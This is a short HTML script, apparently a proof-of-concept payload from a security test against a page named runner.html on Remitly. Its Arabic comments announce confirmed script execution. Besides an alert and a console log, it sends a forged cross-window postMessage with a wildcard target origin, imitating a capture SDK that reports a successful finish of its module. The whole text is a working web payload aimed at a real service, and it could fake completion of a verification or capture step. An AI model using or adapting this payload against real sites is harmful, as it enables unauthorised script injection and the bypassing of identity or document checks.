<script>
  alert(" تم تنفيذ كود داخل runner.html");
  console.log(" RCE مثبت: السكربت تم تحميله وتنفيذه");

  // إرسال رسالة إلى Remitly (اختياري)
  window.parent.postMessage({
    type: "capture-sdk",
    method: "captureModule.finish",
    parameter: [{ status: "success" }, {}]
  }, "*");
</script>
